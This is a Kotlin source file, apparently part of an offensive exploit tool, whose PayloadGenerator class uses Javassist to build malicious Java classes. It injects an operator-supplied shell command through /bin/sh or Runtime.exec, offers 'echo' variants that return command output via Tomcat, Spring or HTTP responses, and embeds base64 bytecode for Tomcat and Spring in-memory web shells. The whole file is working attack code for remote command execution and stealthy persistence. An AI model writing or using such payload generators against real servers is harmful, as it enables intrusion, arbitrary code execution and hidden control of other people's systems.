package payload

import util.Option
import javassist.*
import javassist.bytecode.ClassFile.JAVA_7
import javassist.bytecode.ClassFile.JAVA_8
import java.util.*

class PayloadGenerator {
    private val version = when (Option.javaVersion) {
        7, JAVA_7 -> JAVA_7
        else -> JAVA_8
    }

    fun generate(mapping: String): ByteArray {
        val className = "payload.${dispatch(mapping)}"

        val pool = ClassPool.getDefault()
        val ctClass = pool.get(className).apply {
            classFile.majorVersion = version
            replaceClassName(className, mapping)
        }

        if (mapping == "Echo") {
            // 将执行结果保存到 result 属性中
            ctClass.getDeclaredMethod("exec").insertBefore(
                """{
                    String[] cmd = new String[3];
                    cmd[0] = "/bin/sh";
                    cmd[1] = "-c";
                    cmd[2] = "${Option.command}";
                    byte[] output = (new java.util.Scanner((new ProcessBuilder(cmd)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
                    $0.result = new String(output);
                }""".trimIndent()
            )
        } else if (mapping == "Mem") {
            val filterBytes = pool.getCtClass("payload.memshell.DynamicFilter").toBytecode()
            val b64Bytes = Base64.getEncoder().encode(filterBytes)

            ctClass.getDeclaredMethod("exec").insertBefore("{ $0.filterCode = \"${String(b64Bytes)}\"; }")
        } else {
            ctClass.getDeclaredMethod("exec").insertBefore(
                "{ Runtime.getRuntime().exec(\"${Option.command}\"); }"
            )
        }

        return ctClass.toBytecode()
    }

    private fun dispatch(mapping: String) = when (mapping) {
        "Echo" -> {
            when (Option.echo) {
                "tomcat" -> "echo.TomcatEcho"
                "spring" -> "echo.SpringEcho"
                "http" -> "echo.HTTPEcho"
                else -> throw ClassNotFoundException("Unknown index: $mapping")
            }
        }
        "Mem" -> {
            when (Option.memshell) {
                "tomcat" -> "memshell.TomcatShell"
                "spring" -> "memshell.SpringShell"
                else -> throw ClassNotFoundException("Unknown index: $mapping")
            }
        }
        else -> "Basic"
    }
}
